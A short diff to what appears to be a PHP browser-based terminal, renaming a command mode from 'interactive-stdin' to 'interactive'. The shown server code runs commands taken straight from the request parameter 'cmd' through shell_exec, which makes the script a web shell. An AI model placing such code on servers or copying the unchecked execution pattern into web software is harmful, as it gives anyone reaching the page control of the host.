@@ -90,8 +90,8 @@ var input = '';
 var history = [];
 var currentHistory = 0;
 var $pre = $('<pre>');
-var mode = 'interactive-stdin';
-var supportedModes = ['interactive-stdin','shell_exec'];
+var mode = 'interactive';
+var supportedModes = ['interactive','shell_exec'];
 $('body').append($pre);
 var $output = $('<span class="output"></span>');
 $pre.append($output);
@@ -263,7 +263,7 @@ writeCwdLine();
 return;
 }
 $.post(window.location.href,{action:'exec',cwd:SI.cwd,cmd:statement,mode:mode},function(response){
-if(mode == "interactive-stdin" && response.handle){
+if(mode == "interactive" && response.handle){
 currentHandle = response.handle;
 procStdIn = [];
 readProc();
@@ -474,7 +474,7 @@ if($output === null && ($mode=="shell_exec" || !$mode) ){
 $output = shell_exec($_REQUEST['cmd'].' 2>&1');
 if($output === null) $output = 'Command not found';
 else $output = htmlspecialchars ($output,null,'UTF-8');
-} elseif($mode == "interactive-stdin" && $output === null) {
+} elseif($mode == "interactive" && $output === null) {
 $this->startAsyncProc($cmd);
 exit;
 }
